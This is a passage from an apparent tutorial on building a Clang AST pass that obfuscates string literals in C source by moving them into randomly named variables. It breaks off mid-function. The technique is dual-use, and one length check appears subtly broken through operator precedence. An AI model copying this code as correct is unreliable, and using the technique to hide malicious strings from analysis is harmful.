    </span></span><span class="kwd"><span class="kwd">if</span></span><span class="pln"><span class="pln"> </span></span><span class="pun"><span class="pun">(!</span></span><span class="pln"><span class="pln">SM</span></span><span class="pun"><span class="pun">.</span></span><span class="pln"><span class="pln">isInMainFile</span></span><span class="pun"><span class="pun">(</span></span><span class="typ"><span class="typ">Decl</span></span><span class="pun"><span class="pun">-&gt;</span></span><span class="pln"><span class="pln">getBeginLoc</span></span><span class="pun"><span class="pun">()))</span></span><span class="pln"><span class="pln">
        </span></span><span class="kwd"><span class="kwd">return</span></span><span class="pun"><span class="pun">;</span></span><span class="pln"><span class="pln">

    </span></span><span class="com"><span class="com">// strings that comprise less than 5 characters are not worth the effort</span></span><span class="pln"><span class="pln">
    </span></span><span class="kwd"><span class="kwd">if</span></span><span class="pln"><span class="pln"> </span></span><span class="pun"><span class="pun">(!</span></span><span class="typ"><span class="typ">Decl</span></span><span class="pun"><span class="pun">-&gt;</span></span><span class="pln"><span class="pln">getBytes</span></span><span class="pun"><span class="pun">().</span></span><span class="pln"><span class="pln">str</span></span><span class="pun"><span class="pun">().</span></span><span class="pln"><span class="pln">size</span></span><span class="pun"><span class="pun">()</span></span><span class="pln"><span class="pln"> </span></span><span class="pun"><span class="pun">&gt;</span></span><span class="pln"><span class="pln"> </span></span><span class="lit"><span class="lit">4</span></span><span class="pun"><span class="pun">)</span></span><span class="pln"><span class="pln"> </span></span><span class="pun"><span class="pun">{</span></span><span class="pln"><span class="pln">
        </span></span><span class="kwd"><span class="kwd">return</span></span><span class="pun"><span class="pun">;</span></span><span class="pln"><span class="pln">
    </span></span><span class="pun"><span class="pun">}</span></span><span class="pln"><span class="pln">

    climbParentsIgnoreCast</span></span><span class="pun"><span class="pun">(*</span></span><span class="typ"><span class="typ">Decl</span></span><span class="pun"><span class="pun">,</span></span><span class="pln"><span class="pln"> clang</span></span><span class="pun"><span class="pun">::</span></span><span class="pln"><span class="pln">ast_type_traits</span></span><span class="pun"><span class="pun">::</span></span><span class="typ"><span class="typ">DynTypedNode</span></span><span class="pun"><span class="pun">(),</span></span><span class="pln"><span class="pln"> </span></span><span class="typ"><span class="typ">Result</span></span><span class="pun"><span class="pun">.</span></span><span class="typ"><span class="typ">Context</span></span><span class="pun"><span class="pun">,</span></span><span class="pln"><span class="pln"> </span></span><span class="lit"><span class="lit">0</span></span><span class="pun"><span class="pun">);</span></span><span class="pln"><span class="pln">
</span></span><span class="pun"><span class="pun">}</span></span></code></pre>



<p>From the excerpt shown above, there are three elements worth mentioning:</p>



<ul class="wp-block-list">
<li>We extract the AST node that was matched by the pattern defined in <em>StringEncryptionConsumer</em>. To do that, one can call the function <em><a href="https://clang.llvm.org/doxygen/classclang_1_1ast__matchers_1_1BoundNodes.html">getNodeAs</a></em>, which expects a string as argument that relates to the identifier the pattern was bound to (see the line <code class="hljs gherkin prettyprinted" style=""><span class="kwd">const</span><span class="pln"> </span><span class="kwd">auto</span><span class="pln"> </span><span class="typ">Matcher</span><span class="pln"> </span><span class="pun">=</span><span class="pln"> stringLiteral</span><span class="pun">().</span><span class="pln">bind</span><span class="pun">(</span><span class="str">"decl"</span><span class="pun">)</span></code>)</li>



<li>We skip strings that are not defined in the translation unit under analysis. Indeed, our pass intervenes after <em>Clang</em>‘s preprocessor, which will actually copy-paste included system headers into the translation unit.</li>



<li>Then, we are ready to process the string literal. Since we need to know about the context where this string literal was found, we pass the extracted node to a user-defined function, (<em>climbParentsIgnoreCast</em> in this case, for the lack of a better name), along <em><a href="https://clang.llvm.org/doxygen/structclang_1_1ast__matchers_1_1MatchFinder_1_1MatchResult.html#ab06481084c7027e5779a5a427596f66c">Result.Context</a></em>, which contains a reference to the enclosing AST. The goal is to visit the tree upwards until an interesting node is found. In this case, we are interested in a node of type <em><a href="https://clang.llvm.org/doxygen/classclang_1_1CallExpr.html">CallExpr</a></em>.</li>
</ul>



<pre class="wp-block-code prettyprinted" style=""><code class=" prettyprinted" style=""><span class="kwd"><span class="kwd">bool</span></span><span class="pln"><span class="pln">
</span></span><span class="typ"><span class="typ">MatchHandler</span></span><span class="pun"><span class="pun">::</span></span><span class="pln"><span class="pln">climbParentsIgnoreCast</span></span><span class="pun"><span class="pun">(</span></span><span class="kwd"><span class="kwd">const</span></span><span class="pln"><span class="pln"> </span></span><span class="typ"><span class="typ">StringLiteral</span></span><span class="pln"><span class="pln"> </span></span><span class="pun"><span class="pun">&amp;</span></span><span class="typ"><span class="typ">NodeString</span></span><span class="pun"><span class="pun">,</span></span><span class="pln"><span class="pln"> clang</span></span><span class="pun"><span class="pun">::</span></span><span class="pln"><span class="pln">ast_type_traits</span></span><span class="pun"><span class="pun">::</span></span><span class="typ"><span class="typ">DynTypedNode</span></span><span class="pln"><span class="pln"> node</span></span><span class="pun"><span class="pun">,</span></span><span class="pln"><span class="pln">
                                     clang</span></span><span class="pun"><span class="pun">::</span></span><span class="typ"><span class="typ">ASTContext</span></span><span class="pln"><span class="pln"> </span></span><span class="pun"><span class="pun">*</span></span><span class="kwd"><span class="kwd">const</span></span><span class="pln"><span class="pln"> pContext</span></span><span class="pun"><span class="pun">,</span></span><span class="pln"><span class="pln"> </span></span><span class="typ"><span class="typ">uint64_t</span></span><span class="pln"><span class="pln"> iterations</span></span><span class="pun"><span class="pun">)</span></span><span class="pln"><span class="pln"> </span></span><span class="pun"><span class="pun">{</span></span><span class="pln"><span class="pln">

    </span></span><span class="typ"><span class="typ">ASTContext</span></span><span class="pun"><span class="pun">::</span></span><span class="typ"><span class="typ">DynTypedNodeList</span></span><span class="pln"><span class="pln"> parents </span></span><span class="pun"><span class="pun">=</span></span><span class="pln"><span class="pln"> pContext</span></span><span class="pun"><span class="pun">-&gt;</span></span><span class="pln"><span class="pln">getParents</span></span><span class="pun"><span class="pun">(</span></span><span class="typ"><span class="typ">NodeString</span></span><span class="pun"><span class="pun">);</span></span><span class="pln"><span class="pln">

    </span></span><span class="kwd"><span class="kwd">if</span></span><span class="pln"><span class="pln"> </span></span><span class="pun"><span class="pun">(</span></span><span class="pln"><span class="pln">iterations </span></span><span class="pun"><span class="pun">&gt;</span></span><span class="pln"><span class="pln"> </span></span><span class="lit"><span class="lit">0</span></span><span class="pun"><span class="pun">)</span></span><span class="pln"><span class="pln"> </span></span><span class="pun"><span class="pun">{</span></span><span class="pln"><span class="pln">
        parents </span></span><span class="pun"><span class="pun">=</span></span><span class="pln"><span class="pln"> pContext</span></span><span class="pun"><span class="pun">-&gt;</span></span><span class="pln"><span class="pln">getParents</span></span><span class="pun"><span class="pun">(</span></span><span class="pln"><span class="pln">node</span></span><span class="pun"><span class="pun">);</span></span><span class="pln"><span class="pln">
    </span></span><span class="pun"><span class="pun">}</span></span><span class="pln"><span class="pln">

    </span></span><span class="kwd"><span class="kwd">for</span></span><span class="pln"><span class="pln"> </span></span><span class="pun"><span class="pun">(</span></span><span class="kwd"><span class="kwd">const</span></span><span class="pln"><span class="pln"> </span></span><span class="kwd"><span class="kwd">auto</span></span><span class="pln"><span class="pln"> </span></span><span class="pun"><span class="pun">&amp;</span></span><span class="pln"><span class="pln">parent </span></span><span class="pun"><span class="pun">:</span></span><span class="pln"><span class="pln"> parents</span></span><span class="pun"><span class="pun">)</span></span><span class="pln"><span class="pln"> </span></span><span class="pun"><span class="pun">{</span></span><span class="pln"><span class="pln">

        </span></span><span class="typ"><span class="typ">StringRef</span></span><span class="pln"><span class="pln"> </span></span><span class="typ"><span class="typ">ParentNodeKind</span></span><span class="pln"><span class="pln"> </span></span><span class="pun"><span class="pun">=</span></span><span class="pln"><span class="pln"> parent</span></span><span class="pun"><span class="pun">.</span></span><span class="pln"><span class="pln">getNodeKind</span></span><span class="pun"><span class="pun">().</span></span><span class="pln"><span class="pln">asStringRef</span></span><span class="pun"><span class="pun">();</span></span><span class="pln"><span class="pln">

        </span></span><span class="kwd"><span class="kwd">if</span></span><span class="pln"><span class="pln"> </span></span><span class="pun"><span class="pun">(</span></span><span class="typ"><span class="typ">ParentNodeKind</span></span><span class="pun"><span class="pun">.</span></span><span class="pln"><span class="pln">find</span></span><span class="pun"><span class="pun">(</span></span><span class="str"><span class="str">"Cast"</span></span><span class="pun"><span class="pun">)</span></span><span class="pln"><span class="pln"> </span></span><span class="pun"><span class="pun">!=</span></span><span class="pln"><span class="pln"> std</span></span><span class="pun"><span class="pun">::</span></span><span class="kwd"><span class="kwd">string</span></span><span class="pun"><span class="pun">::</span></span><span class="pln"><span class="pln">npos</span></span><span class="pun"><span class="pun">)</span></span><span class="pln"><span class="pln"> </span></span><span class="pun"><span class="pun">{</span></span><span class="pln"><span class="pln">

            </span></span><span class="kwd"><span class="kwd">return</span></span><span class="pln"><span class="pln"> climbParentsIgnoreCast</span></span><span class="pun"><span class="pun">(</span></span><span class="typ"><span class="typ">NodeString</span></span><span class="pun"><span class="pun">,</span></span><span class="pln"><span class="pln"> parent</span></span><span class="pun"><span class="pun">,</span></span><span class="pln"><span class="pln"> pContext</span></span><span class="pun"><span class="pun">,</span></span><span class="pln"><span class="pln"> </span></span><span class="pun"><span class="pun">++</span></span><span class="pln"><span class="pln">iterations</span></span><span class="pun"><span class="pun">);</span></span><span class="pln"><span class="pln">
        </span></span><span class="pun"><span class="pun">}</span></span><span class="pln"><span class="pln">

        handleStringInContext</span></span><span class="pun"><span class="pun">(&amp;</span></span><span class="typ"><span class="typ">NodeString</span></span><span class="pun"><span class="pun">,</span></span><span class="pln"><span class="pln"> pContext</span></span><span class="pun"><span class="pun">,</span></span><span class="pln"><span class="pln"> parent</span></span><span class="pun"><span class="pun">);</span></span><span class="pln"><span class="pln">
    </span></span><span class="pun"><span class="pun">}</span></span><span class="pln"><span class="pln">

    </span></span><span class="kwd"><span class="kwd">return</span></span><span class="pln"><span class="pln"> </span></span><span class="kwd"><span class="kwd">false</span></span><span class="pun"><span class="pun">;</span></span><span class="pln"><span class="pln">
</span></span><span class="pun"><span class="pun">}</span></span></code></pre>



<p>In a nutshell, this function recursively looks up the parent nodes of a <em>StringLiteral</em> node, until it finds one that should be interesting (i.e. not a “cast”). <em>handleStringInContext</em> is also straight-forward:</p>



<pre class="wp-block-code prettyprinted" style=""><code class=" prettyprinted" style=""><span class="kwd"><span class="kwd">void</span></span><span class="pln"><span class="pln"> </span></span><span class="typ"><span class="typ">MatchHandler</span></span><span class="pun"><span class="pun">::</span></span><span class="pln"><span class="pln">handleStringInContext</span></span><span class="pun"><span class="pun">(</span></span><span class="kwd"><span class="kwd">const</span></span><span class="pln"><span class="pln"> clang</span></span><span class="pun"><span class="pun">::</span></span><span class="typ"><span class="typ">StringLiteral</span></span><span class="pln"><span class="pln"> </span></span><span class="pun"><span class="pun">*</span></span><span class="pln"><span class="pln">pLiteral</span></span><span class="pun"><span class="pun">,</span></span><span class="pln"><span class="pln"> clang</span></span><span class="pun"><span class="pun">::</span></span><span class="typ"><span class="typ">ASTContext</span></span><span class="pln"><span class="pln"> </span></span><span class="pun"><span class="pun">*</span></span><span class="kwd"><span class="kwd">const</span></span><span class="pln"><span class="pln"> pContext</span></span><span class="pun"><span class="pun">,</span></span><span class="pln"><span class="pln">
                                         </span></span><span class="kwd"><span class="kwd">const</span></span><span class="pln"><span class="pln"> clang</span></span><span class="pun"><span class="pun">::</span></span><span class="pln"><span class="pln">ast_type_traits</span></span><span class="pun"><span class="pun">::</span></span><span class="typ"><span class="typ">DynTypedNode</span></span><span class="pln"><span class="pln"> node</span></span><span class="pun"><span class="pun">)</span></span><span class="pln"><span class="pln"> </span></span><span class="pun"><span class="pun">{</span></span><span class="pln"><span class="pln">

    </span></span><span class="typ"><span class="typ">StringRef</span></span><span class="pln"><span class="pln"> </span></span><span class="typ"><span class="typ">ParentNodeKind</span></span><span class="pln"><span class="pln"> </span></span><span class="pun"><span class="pun">=</span></span><span class="pln"><span class="pln"> node</span></span><span class="pun"><span class="pun">.</span></span><span class="pln"><span class="pln">getNodeKind</span></span><span class="pun"><span class="pun">().</span></span><span class="pln"><span class="pln">asStringRef</span></span><span class="pun"><span class="pun">();</span></span><span class="pln"><span class="pln">

    </span></span><span class="kwd"><span class="kwd">if</span></span><span class="pln"><span class="pln"> </span></span><span class="pun"><span class="pun">(</span></span><span class="typ"><span class="typ">ParentNodeKind</span></span><span class="pun"><span class="pun">.</span></span><span class="pln"><span class="pln">compare</span></span><span class="pun"><span class="pun">(</span></span><span class="str"><span class="str">"CallExpr"</span></span><span class="pun"><span class="pun">)</span></span><span class="pln"><span class="pln"> </span></span><span class="pun"><span class="pun">==</span></span><span class="pln"><span class="pln"> </span></span><span class="lit"><span class="lit">0</span></span><span class="pun"><span class="pun">)</span></span><span class="pln"><span class="pln"> </span></span><span class="pun"><span class="pun">{</span></span><span class="pln"><span class="pln">
        handleCallExpr</span></span><span class="pun"><span class="pun">(</span></span><span class="pln"><span class="pln">pLiteral</span></span><span class="pun"><span class="pun">,</span></span><span class="pln"><span class="pln"> pContext</span></span><span class="pun"><span class="pun">,</span></span><span class="pln"><span class="pln"> node</span></span><span class="pun"><span class="pun">);</span></span><span class="pln"><span class="pln">
    </span></span><span class="pun"><span class="pun">}</span></span><span class="pln"><span class="pln"> </span></span><span class="kwd"><span class="kwd">else</span></span><span class="pln"><span class="pln"> </span></span><span class="kwd"><span class="kwd">if</span></span><span class="pln"><span class="pln"> </span></span><span class="pun"><span class="pun">(</span></span><span class="typ"><span class="typ">ParentNodeKind</span></span><span class="pun"><span class="pun">.</span></span><span class="pln"><span class="pln">compare</span></span><span class="pun"><span class="pun">(</span></span><span class="str"><span class="str">"InitListExpr"</span></span><span class="pun"><span class="pun">)</span></span><span class="pln"><span class="pln"> </span></span><span class="pun"><span class="pun">==</span></span><span class="pln"><span class="pln"> </span></span><span class="lit"><span class="lit">0</span></span><span class="pun"><span class="pun">)</span></span><span class="pln"><span class="pln"> </span></span><span class="pun"><span class="pun">{</span></span><span class="pln"><span class="pln">
        handleInitListExpr</span></span><span class="pun"><span class="pun">(</span></span><span class="pln"><span class="pln">pLiteral</span></span><span class="pun"><span class="pun">,</span></span><span class="pln"><span class="pln"> pContext</span></span><span class="pun"><span class="pun">,</span></span><span class="pln"><span class="pln"> node</span></span><span class="pun"><span class="pun">);</span></span><span class="pln"><span class="pln">
    </span></span><span class="pun"><span class="pun">}</span></span><span class="pln"><span class="pln"> </span></span><span class="kwd"><span class="kwd">else</span></span><span class="pln"><span class="pln"> </span></span><span class="pun"><span class="pun">{</span></span><span class="pln"><span class="pln">
        llvm</span></span><span class="pun"><span class="pun">::</span></span><span class="pln"><span class="pln">outs</span></span><span class="pun"><span class="pun">()</span></span><span class="pln"><span class="pln"> </span></span><span class="pun"><span class="pun">&lt;&lt;</span></span><span class="pln"><span class="pln"> </span></span><span class="str"><span class="str">"Unhandled context "</span></span><span class="pln"><span class="pln"> </span></span><span class="pun"><span class="pun">&lt;&lt;</span></span><span class="pln"><span class="pln"> </span></span><span class="typ"><span class="typ">ParentNodeKind</span></span><span class="pln"><span class="pln"> </span></span><span class="pun"><span class="pun">&lt;&lt;</span></span><span class="pln"><span class="pln"> </span></span><span class="str"><span class="str">" for string "</span></span><span class="pln"><span class="pln"> </span></span><span class="pun"><span class="pun">&lt;&lt;</span></span><span class="pln"><span class="pln"> pLiteral</span></span><span class="pun"><span class="pun">-&gt;</span></span><span class="pln"><span class="pln">getBytes</span></span><span class="pun"><span class="pun">()</span></span><span class="pln"><span class="pln"> </span></span><span class="pun"><span class="pun">&lt;&lt;</span></span><span class="pln"><span class="pln"> </span></span><span class="str"><span class="str">"\n"</span></span><span class="pun"><span class="pun">;</span></span><span class="pln"><span class="pln">
    </span></span><span class="pun"><span class="pun">}</span></span><span class="pln"><span class="pln">
</span></span><span class="pun"><span class="pun">}</span></span></code></pre>



<p>As evident from the snippet above, only two kind of nodes are actually handled. It should also be quite easy to add more if needed. Indeed, both cases are already handled in a similar fashion.</p>



<pre class="wp-block-code prettyprinted" style=""><code class=" prettyprinted" style=""><span class="kwd"><span class="kwd">void</span></span><span class="pln"><span class="pln"> </span></span><span class="typ"><span class="typ">MatchHandler</span></span><span class="pun"><span class="pun">::</span></span><span class="pln"><span class="pln">handleCallExpr</span></span><span class="pun"><span class="pun">(</span></span><span class="kwd"><span class="kwd">const</span></span><span class="pln"><span class="pln"> clang</span></span><span class="pun"><span class="pun">::</span></span><span class="typ"><span class="typ">StringLiteral</span></span><span class="pln"><span class="pln"> </span></span><span class="pun"><span class="pun">*</span></span><span class="pln"><span class="pln">pLiteral</span></span><span class="pun"><span class="pun">,</span></span><span class="pln"><span class="pln"> clang</span></span><span class="pun"><span class="pun">::</span></span><span class="typ"><span class="typ">ASTContext</span></span><span class="pln"><span class="pln"> </span></span><span class="pun"><span class="pun">*</span></span><span class="kwd"><span class="kwd">const</span></span><span class="pln"><span class="pln"> pContext</span></span><span class="pun"><span class="pun">,</span></span><span class="pln"><span class="pln">
                                  </span></span><span class="kwd"><span class="kwd">const</span></span><span class="pln"><span class="pln"> clang</span></span><span class="pun"><span class="pun">::</span></span><span class="pln"><span class="pln">ast_type_traits</span></span><span class="pun"><span class="pun">::</span></span><span class="typ"><span class="typ">DynTypedNode</span></span><span class="pln"><span class="pln"> node</span></span><span class="pun"><span class="pun">)</span></span><span class="pln"><span class="pln"> </span></span><span class="pun"><span class="pun">{</span></span><span class="pln"><span class="pln">

    </span></span><span class="kwd"><span class="kwd">const</span></span><span class="pln"><span class="pln"> </span></span><span class="kwd"><span class="kwd">auto</span></span><span class="pln"><span class="pln"> </span></span><span class="pun"><span class="pun">*</span></span><span class="typ"><span class="typ">FunctionCall</span></span><span class="pln"><span class="pln"> </span></span><span class="pun"><span class="pun">=</span></span><span class="pln"><span class="pln"> node</span></span><span class="pun"><span class="pun">.</span></span><span class="kwd"><span class="kwd">get</span></span><span class="pun"><span class="pun">&lt;</span></span><span class="pln"><span class="pln">clang</span></span><span class="pun"><span class="pun">::</span></span><span class="typ"><span class="typ">CallExpr</span></span><span class="pun"><span class="pun">&gt;();</span></span><span class="pln"><span class="pln">

    </span></span><span class="kwd"><span class="kwd">if</span></span><span class="pln"><span class="pln"> </span></span><span class="pun"><span class="pun">(</span></span><span class="pln"><span class="pln">isBlacklistedFunction</span></span><span class="pun"><span class="pun">(</span></span><span class="typ"><span class="typ">FunctionCall</span></span><span class="pun"><span class="pun">))</span></span><span class="pln"><span class="pln"> </span></span><span class="pun"><span class="pun">{</span></span><span class="pln"><span class="pln">
        </span></span><span class="kwd"><span class="kwd">return</span></span><span class="pun"><span class="pun">;</span></span><span class="pln"><span class="pln"> </span></span><span class="com"><span class="com">// exclude printf-like functions when the replacement is not constant anymore (C89 standard...).</span></span><span class="pln"><span class="pln">
    </span></span><span class="pun"><span class="pun">}</span></span><span class="pln"><span class="pln">

    handleExpr</span></span><span class="pun"><span class="pun">(</span></span><span class="pln"><span class="pln">pLiteral</span></span><span class="pun"><span class="pun">,</span></span><span class="pln"><span class="pln"> pContext</span></span><span class="pun"><span class="pun">,</span></span><span class="pln"><span class="pln"> node</span></span><span class="pun"><span class="pun">);</span></span><span class="pln"><span class="pln">
</span></span><span class="pun"><span class="pun">}</span></span><span class="pln"><span class="pln">

</span></span><span class="kwd"><span class="kwd">void</span></span><span class="pln"><span class="pln"> </span></span><span class="typ"><span class="typ">MatchHandler</span></span><span class="pun"><span class="pun">::</span></span><span class="pln"><span class="pln">handleInitListExpr</span></span><span class="pun"><span class="pun">(</span></span><span class="kwd"><span class="kwd">const</span></span><span class="pln"><span class="pln"> clang</span></span><span class="pun"><span class="pun">::</span></span><span class="typ"><span class="typ">StringLiteral</span></span><span class="pln"><span class="pln"> </span></span><span class="pun"><span class="pun">*</span></span><span class="pln"><span class="pln">pLiteral</span></span><span class="pun"><span class="pun">,</span></span><span class="pln"><span class="pln"> clang</span></span><span class="pun"><span class="pun">::</span></span><span class="typ"><span class="typ">ASTContext</span></span><span class="pln"><span class="pln"> </span></span><span class="pun"><span class="pun">*</span></span><span class="kwd"><span class="kwd">const</span></span><span class="pln"><span class="pln"> pContext</span></span><span class="pun"><span class="pun">,</span></span><span class="pln"><span class="pln">
                                      </span></span><span class="kwd"><span class="kwd">const</span></span><span class="pln"><span class="pln"> clang</span></span><span class="pun"><span class="pun">::</span></span><span class="pln"><span class="pln">ast_type_traits</span></span><span class="pun"><span class="pun">::</span></span><span class="typ"><span class="typ">DynTypedNode</span></span><span class="pln"><span class="pln"> node</span></span><span class="pun"><span class="pun">)</span></span><span class="pln"><span class="pln"> </span></span><span class="pun"><span class="pun">{</span></span><span class="pln"><span class="pln">

    handleExpr</span></span><span class="pun"><span class="pun">(</span></span><span class="pln"><span class="pln">pLiteral</span></span><span class="pun"><span class="pun">,</span></span><span class="pln"><span class="pln"> pContext</span></span><span class="pun"><span class="pun">,</span></span><span class="pln"><span class="pln"> node</span></span><span class="pun"><span class="pun">);</span></span><span class="pln"><span class="pln">
</span></span><span class="pun"><span class="pun">}</span></span></code></pre>



<h4 class="wp-block-heading">Replacing string literals</h4>



<p>Since both <em><a href="https://clang.llvm.org/doxygen/classclang_1_1CallExpr.html">CallExpr</a></em> and <em><a href="https://clang.llvm.org/doxygen/classclang_1_1InitListExpr.html">InitListExpr</a></em> can be handled in a similar fashion, we define a common function usable by both.</p>



<pre class="wp-block-code prettyprinted" style=""><code class=" prettyprinted" style=""><span class="kwd"><span class="kwd">bool</span></span><span class="pln"><span class="pln"> </span></span><span class="typ"><span class="typ">MatchHandler</span></span><span class="pun"><span class="pun">::</span></span><span class="pln"><span class="pln">handleExpr</span></span><span class="pun"><span class="pun">(</span></span><span class="kwd"><span class="kwd">const</span></span><span class="pln"><span class="pln"> clang</span></span><span class="pun"><span class="pun">::</span></span><span class="typ"><span class="typ">StringLiteral</span></span><span class="pln"><span class="pln"> </span></span><span class="pun"><span class="pun">*</span></span><span class="pln"><span class="pln">pLiteral</span></span><span class="pun"><span class="pun">,</span></span><span class="pln"><span class="pln"> clang</span></span><span class="pun"><span class="pun">::</span></span><span class="typ"><span class="typ">ASTContext</span></span><span class="pln"><span class="pln"> </span></span><span class="pun"><span class="pun">*</span></span><span class="kwd"><span class="kwd">const</span></span><span class="pln"><span class="pln"> pContext</span></span><span class="pun"><span class="pun">,</span></span><span class="pln"><span class="pln">
                                  </span></span><span class="kwd"><span class="kwd">const</span></span><span class="pln"><span class="pln"> clang</span></span><span class="pun"><span class="pun">::</span></span><span class="pln"><span class="pln">ast_type_traits</span></span><span class="pun"><span class="pun">::</span></span><span class="typ"><span class="typ">DynTypedNode</span></span><span class="pln"><span class="pln"> node</span></span><span class="pun"><span class="pun">)</span></span><span class="pln"><span class="pln"> </span></span><span class="pun"><span class="pun">{</span></span><span class="pln"><span class="pln">

    clang</span></span><span class="pun"><span class="pun">::</span></span><span class="typ"><span class="typ">SourceRange</span></span><span class="pln"><span class="pln"> </span></span><span class="typ"><span class="typ">LiteralRange</span></span><span class="pln"><span class="pln"> </span></span><span class="pun"><span class="pun">=</span></span><span class="pln"><span class="pln"> clang</span></span><span class="pun"><span class="pun">::</span></span><span class="typ"><span class="typ">SourceRange</span></span><span class="pun"><span class="pun">(</span></span><span class="pln"><span class="pln">
            </span></span><span class="typ"><span class="typ">ASTRewriter</span></span><span class="pun"><span class="pun">-&gt;</span></span><span class="pln"><span class="pln">getSourceMgr</span></span><span class="pun"><span class="pun">().</span></span><span class="pln"><span class="pln">getFileLoc</span></span><span class="pun"><span class="pun">(</span></span><span class="pln"><span class="pln">pLiteral</span></span><span class="pun"><span class="pun">-&gt;</span></span><span class="pln"><span class="pln">getBeginLoc</span></span><span class="pun"><span class="pun">()),</span></span><span class="pln"><span class="pln">
            </span></span><span class="typ"><span class="typ">ASTRewriter</span></span><span class="pun"><span class="pun">-&gt;</span></span><span class="pln"><span class="pln">getSourceMgr</span></span><span class="pun"><span class="pun">().</span></span><span class="pln"><span class="pln">getFileLoc</span></span><span class="pun"><span class="pun">(</span></span><span class="pln"><span class="pln">pLiteral</span></span><span class="pun"><span class="pun">-&gt;</span></span><span class="pln"><span class="pln">getEndLoc</span></span><span class="pun"><span class="pun">())</span></span><span class="pln"><span class="pln">
    </span></span><span class="pun"><span class="pun">);</span></span><span class="pln"><span class="pln">

    </span></span><span class="kwd"><span class="kwd">if</span></span><span class="pun"><span class="pun">(</span></span><span class="pln"><span class="pln">shouldAbort</span></span><span class="pun"><span class="pun">(</span></span><span class="pln"><span class="pln">pLiteral</span></span><span class="pun"><span class="pun">,</span></span><span class="pln"><span class="pln"> pContext</span></span><span class="pun"><span class="pun">,</span></span><span class="pln"><span class="pln"> </span></span><span class="typ"><span class="typ">LiteralRange</span></span><span class="pun"><span class="pun">))</span></span><span class="pln"><span class="pln">
        </span></span><span class="kwd"><span class="kwd">return</span></span><span class="pln"><span class="pln"> </span></span><span class="kwd"><span class="kwd">false</span></span><span class="pun"><span class="pun">;</span></span><span class="pln"><span class="pln">

    std</span></span><span class="pun"><span class="pun">::</span></span><span class="kwd"><span class="kwd">string</span></span><span class="pln"><span class="pln"> </span></span><span class="typ"><span class="typ">Replacement</span></span><span class="pln"><span class="pln"> </span></span><span class="pun"><span class="pun">=</span></span><span class="pln"><span class="pln"> translateStringToIdentifier</span></span><span class="pun"><span class="pun">(</span></span><span class="pln"><span class="pln">pLiteral</span></span><span class="pun"><span class="pun">-&gt;</span></span><span class="pln"><span class="pln">getBytes</span></span><span class="pun"><span class="pun">().</span></span><span class="pln"><span class="pln">str</span></span><span class="pun"><span class="pun">());</span></span><span class="pln"><span class="pln">

    </span></span><span class="kwd"><span class="kwd">if</span></span><span class="pun"><span class="pun">(!</span></span><span class="pln"><span class="pln">insertVariableDeclaration</span></span><span class="pun"><span class="pun">(</span></span><span class="pln"><span class="pln">pLiteral</span></span><span class="pun"><span class="pun">,</span></span><span class="pln"><span class="pln"> pContext</span></span><span class="pun"><span class="pun">,</span></span><span class="pln"><span class="pln"> </span></span><span class="typ"><span class="typ">LiteralRange</span></span><span class="pun"><span class="pun">,</span></span><span class="pln"><span class="pln"> </span></span><span class="typ"><span class="typ">Replacement</span></span><span class="pun"><span class="pun">))</span></span><span class="pln"><span class="pln">
        </span></span><span class="kwd"><span class="kwd">return</span></span><span class="pln"><span class="pln"> </span></span><span class="kwd"><span class="kwd">false</span></span><span class="pln"><span class="pln"> </span></span><span class="pun"><span class="pun">;</span></span><span class="pln"><span class="pln">

    </span></span><span class="typ"><span class="typ">Globs</span></span><span class="pun"><span class="pun">::</span></span><span class="typ"><span class="typ">PatchedSourceLocation</span></span><span class="pun"><span class="pun">.</span></span><span class="pln"><span class="pln">push_back</span></span><span class="pun"><span class="pun">(</span></span><span class="typ"><span class="typ">LiteralRange</span></span><span class="pun"><span class="pun">);</span></span><span class="pln"><span class="pln">

    </span></span><span class="kwd"><span class="kwd">return</span></span><span class="pln"><span class="pln"> replaceStringLiteral</span></span><span class="pun"><span class="pun">(</span></span><span class="pln"><span class="pln">pLiteral</span></span><span class="pun"><span class="pun">,</span></span><span class="pln"><span class="pln"> pContext</span></span><span class="pun"><span class="pun">,</span></span><span class="pln"><span class="pln"> </span></span><span class="typ"><span class="typ">LiteralRange</span></span><span class="pun"><span class="pun">,</span></span><span class="pln"><span class="pln"> </span></span><span class="typ"><span class="typ">Replacement</span></span><span class="pun"><span class="pun">);</span></span><span class="pln"><span class="pln">
</span></span><span class="pun"><span class="pun">}</span></span></code></pre>



<ul class="wp-block-list">
<li>We randomly generate a variable name.</li>



<li>Find some empty space at the nearest location and insert the variable declaration. This is basically a wrapper around <code class="hljs gherkin prettyprinted" style=""><span class="typ">ASTRewriter</span><span class="pun">-&gt;</span><span class="typ">InsertText</span><span class="pun">()</span></code>.</li>



<li>Replace the string with the identifier generated in step 1.</li>



<li>Add the string literal location to a collection. This is useful because when visiting <em>InitListExpr</em>, the same string literal will appear twice (no idea why).</li>
</ul>



<p>The last step is the only one that is tricky to implement really, so let us focus on that first:</p>



<pre class="wp-block-code prettyprinted" style=""><code class=" prettyprinted" style=""><span class="kwd"><span class="kwd">bool</span></span><span class="pln"><span class="pln"> </span></span><span class="typ"><span class="typ">MatchHandler</span></span><span class="pun"><span class="pun">::</span></span><span class="pln"><span class="pln">replaceStringLiteral</span></span><span class="pun"><span class="pun">(</span></span><span class="kwd"><span class="kwd">const</span></span><span class="pln"><span class="pln"> clang</span></span><span class="pun"><span class="pun">::</span></span><span class="typ"><span class="typ">StringLiteral</span></span><span class="pln"><span class="pln"> </span></span><span class="pun"><span class="pun">*</span></span><span class="pln"><span class="pln">pLiteral</span></span><span class="pun"><span class="pun">,</span></span><span class="pln"><span class="pln"> clang</span></span><span class="pun"><span class="pun">::</span></span><span class="typ"><span class="typ">ASTContext</span></span><span class="pln"><span class="pln"> </span></span><span class="pun"><span class="pun">*</span></span><span class="kwd"><span class="kwd">const</span></span><span class="pln"><span class="pln"> pContext</span></span><span class="pun"><span class="pun">,</span></span><span class="pln"><span class="pln">
                                        clang</span></span><span class="pun"><span class="pun">::</span></span><span class="typ"><span class="typ">SourceRange</span></span><span class="pln"><span class="pln"> </span></span><span class="typ"><span class="typ">LiteralRange</span></span><span class="pun"><span class="pun">,</span></span><span class="pln"><span class="pln">
                                        </span></span><span class="kwd"><span class="kwd">const</span></span><span class="pln"><span class="pln"> std</span></span><span class="pun"><span class="pun">::</span></span><span class="kwd"><span class="kwd">string</span></span><span class="pun"><span class="pun">&amp;</span></span><span class="pln"><span class="pln"> </span></span><span class="typ"><span class="typ">Replacement</span></span><span class="pun"><span class="pun">)</span></span><span class="pln"><span class="pln"> </span></span><span class="pun"><span class="pun">{</span></span><span class="pln"><span class="pln">

